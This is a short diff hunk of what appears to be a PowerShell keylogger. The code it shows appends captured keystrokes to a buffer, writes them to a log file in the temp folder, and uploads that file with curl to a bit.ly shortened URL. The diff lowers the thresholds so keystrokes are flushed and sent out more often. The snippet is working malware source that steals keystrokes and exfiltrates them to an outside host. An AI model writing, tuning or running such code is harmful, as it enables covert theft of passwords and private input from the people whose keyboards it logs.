@@ -36,12 +36,12 @@ function run-key()
             # add key to logger file
             $lista += $mychar
             $counter++
-            if ($counter -ge 100)
+            if ($counter -ge 20)
             {
               $counter = 0
               cmd.exe /c "echo $lista>>%temp%\log.dat"
               $send++
-              if ($send -ge 5)
+              if ($send -ge 3)
               {
                 $send = 0
                 cmd.exe /c "curl -T %temp%\log.dat -Ls https://bit.ly/3DHmzBN"
